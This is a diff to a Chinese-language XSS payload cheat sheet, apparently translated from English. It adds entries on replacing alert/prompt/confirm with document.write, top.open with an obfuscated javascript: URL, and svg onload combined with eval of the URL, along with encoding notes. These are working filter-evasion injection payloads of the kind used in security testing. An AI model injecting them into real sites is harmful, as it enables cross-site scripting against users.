@@ -275,13 +275,24 @@ top['al\145rt'](1)
 top[8680439..toString(30)](1)
 ```
 **44.Alert Alternative – Write & Writeln (弹窗代替方案-Write & Writeln)** <br>
-以下payload用作弹窗函数:alert，prompt,confirm的替代方法。 如果在HTML标签块中则可以直接使用，但如果是javascript注入，则需要完整的"document.write"形式。 URL中将"＆"替换为"％26"，将"＃"替换为"％23"。 可以用writeln代替Write。
+以下payload用作弹窗函数:`alert`，`prompt`,`confirm`的替代方法。 如果在HTML标签块中则可以直接使用，但如果是javascript注入，则需要完整的"document.write"形式。 URL中将"＆"替换为"％26"，将"＃"替换为"％23"。 可以用writeln代替Write。 <br>
 ```
 write`XSSed!`
 write`<img/src/o&#78error=alert&lpar;1)&gt;`
 write('\74img/src/o\156error\75alert\501\51\76')
 ```
-
+**45.Alert Alternative – Open Pseudo-Protocol (弹窗代替方案-使用伪协议打开)** <br>
+以下payload用作弹窗函数:`alert`，`prompt`,`confirm`的替代方法。 以上技巧也适用于此。 但只有第二个payload可以在基于Chromium的浏览器中触发，并且需要`<iframe name = 0>`。<br>
+```
+top.open`javas\cript:al\ert\x281\x29`
+top.open`javas\cript:al\ert\x281\x29${0}0`
+```
+**46.Alert Alternative - Eval + URL (弹窗代替方案-eval+url)** <br>
+以下payload用作弹窗函数:`alert`，`prompt`,`confirm`的替代方法。第一个payload是原始形式，第二个payload是eval，它使用payload的id属性值替换eval。<br> URL必须采用以下方式:在PHP扩展后的URL路径中或URL的片段中。 加号（+）必须用URL进行编码。<br>
+```
+<svg onload=eval(" ' "+URL)>
+<svg id=eval onload=top[id](" ' "+URL)>
+```
 
 ## 致谢
 **英文议题作者：** <br>
